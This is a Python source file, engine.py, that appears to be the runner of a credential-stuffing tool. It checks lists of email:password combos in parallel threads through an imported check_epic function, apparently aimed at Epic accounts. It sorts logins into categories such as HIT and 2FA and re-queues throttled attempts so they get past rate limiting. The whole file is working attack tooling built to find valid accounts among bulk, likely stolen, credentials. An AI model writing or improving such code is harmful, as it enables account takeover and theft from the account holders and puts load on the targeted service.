"""
engine.py — Multi-threaded check runner with RETRY re-queue
"""
import time
import threading
from collections import defaultdict

from config  import THREADS, MAX_RETRIES
from checker import check_epic

# user IDs currently running a job (prevents double-runs)
BUSY: set[int] = set()


def _run_pass(
    combos:      list[tuple[str, str]],
    progress_cb,
    checked_offset: int = 0,
    total_all:      int = 0,
    shared_stats:   dict | None = None,
) -> dict[str, list]:
    """
    Run one pass of checking over combos.
    Returns results dict: { status: ["email:pass", ...] }
    progress_cb(checked_so_far, total_all, stats)
    """
    if shared_stats is None:
        shared_stats = defaultdict(int)

    results  = defaultdict(list)
    lock     = threading.Lock()
    checked  = [checked_offset]
    last_cb  = [0.0]

    def worker(email: str, password: str):
        status = check_epic(email, password)
        line   = f"{email}:{password}"
        with lock:
            shared_stats[status] += 1
            results[status].append(line)
            checked[0] += 1
            now = time.time()
            if now - last_cb[0] >= 1.5 or checked[0] == total_all:
                last_cb[0] = now
                progress_cb(checked[0], total_all, dict(shared_stats))

    sem     = threading.BoundedSemaphore(THREADS)
    threads = []
    for email, password in combos:
        sem.acquire()
        def task(e=email, p=password):
            try:
                worker(e, p)
            finally:
                sem.release()
        t = threading.Thread(target=task, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return dict(results)


def run_check(
    combos:      list[tuple[str, str]],
    progress_cb,   # (checked: int, total: int, stats: dict) → None
    done_cb,       # (results: dict[str, list[str]])          → None
):
    """
    Full check with automatic RETRY re-queue.

    Pass 1: check all combos.
    Pass 2..N: re-check anything that returned RETRY (up to MAX_RETRIES times).
    RETRY combos that still fail after all retries are saved under key "RETRY".

    done_cb receives merged results dict:
        HIT | 2FA | BAD | DEAD | ERROR | RETRY
    """
    merged_stats: dict = defaultdict(int)

    # ── pass 1 ────────────────────────────────────────────────────────────────
    total      = len(combos)
    pass1      = _run_pass(combos, progress_cb,
                           checked_offset=0,
                           total_all=total,
                           shared_stats=merged_stats)

    # merge pass 1 into final results (everything except RETRY)
    final: dict[str, list] = defaultdict(list)
    for status, lines in pass1.items():
        if status != "RETRY":
            final[status].extend(lines)

    retry_lines = pass1.get("RETRY", [])

    # ── retry passes ──────────────────────────────────────────────────────────
    for attempt in range(MAX_RETRIES):
        if not retry_lines:
            break

        # re-parse lines back to (email, pass) tuples
        retry_combos = []
        for line in retry_lines:
            parts = line.split(":", 1)
            if len(parts) == 2:
                retry_combos.append((parts[0], parts[1]))

        checked_so_far = total - len(retry_combos)
        retry_pass = _run_pass(
            retry_combos, progress_cb,
            checked_offset=checked_so_far,
            total_all=total,
            shared_stats=merged_stats,
        )

        retry_lines = []
        for status, lines in retry_pass.items():
            if status == "RETRY":
                retry_lines = lines   # still throttled → next attempt
            else:
                final[status].extend(lines)

    # anything still RETRY after all passes → save as RETRY
    if retry_lines:
        final["RETRY"].extend(retry_lines)

    done_cb(dict(final))
